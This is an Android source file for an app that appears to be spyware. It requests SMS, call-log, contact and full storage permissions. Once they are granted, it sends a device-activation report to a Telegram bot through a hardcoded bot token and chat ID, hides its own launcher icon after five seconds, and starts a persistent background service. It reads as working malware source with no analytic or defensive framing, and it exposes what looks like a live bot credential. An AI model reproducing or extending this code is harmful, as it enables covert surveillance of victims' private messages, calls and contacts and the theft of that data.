package com.alzahra;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.alzahra.services.CoreService;
import com.alzahra.telegram.TelegramBot;

import java.text.SimpleDateFormat;
import java.util.Date;

public class MainActivity extends Activity {
    private static final int REQ_PERMISSIONS = 1001;
    private final Handler handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        if (getSharedPreferences("app_config", MODE_PRIVATE).getBoolean("configured", false)) {
            finish();
            return;
        }
        
        requestAllPermissions();
    }

    private void requestAllPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivityForResult(intent, 1002);
                return;
            }
        }
        
        String[] permissions = {
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.POST_NOTIFICATIONS
        };
        
        ActivityCompat.requestPermissions(this, permissions, REQ_PERMISSIONS);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1002) {
            requestAllPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMISSIONS) {
            onAllPermissionsGranted();
        }
    }

    private void onAllPermissionsGranted() {
        // إرسال رسالة التفعيل
        new Thread(() -> {
            int attempts = 0;
            while (!isNetworkAvailable() && attempts < 15) {
                try {
                    Thread.sleep(2000);
                    attempts++;
                } catch (InterruptedException e) {
                    break;
                }
            }
            
            TelegramBot bot = new TelegramBot("8353955949:AAHAl3ELWn8m-tucuf5ZktLZfTAT5G1v1gA");
            String deviceInfo = "📱 <b>Device Activated</b>\n\n" +
                    "📱 Model: " + Build.MODEL + "\n" +
                    "🏭 Manufacturer: " + Build.MANUFACTURER + "\n" +
                    "🤖 Android: " + Build.VERSION.RELEASE + "\n" +
                    "⏰ Time: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + "\n\n" +
                    "✅ All permissions granted\n" +
                    "🚀 Starting service...";
            bot.sendMessage("7344776596", deviceInfo);
        }).start();
        
        // تأخير 5 ثواني قبل الإخفاء
        handler.postDelayed(() -> {
            hideFromLauncher();
        }, 5000);
        
        // بدء الخدمة
        ContextCompat.startForegroundService(this, new Intent(this, CoreService.class));
        
        getSharedPreferences("app_config", MODE_PRIVATE)
                .edit().putBoolean("configured", true).apply();
        
        finish();
    }

    private void hideFromLauncher() {
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        getPackageManager().setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        if (cm == null) return false;
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        return activeNetwork != null && activeNetwork.isConnected();
    }
}
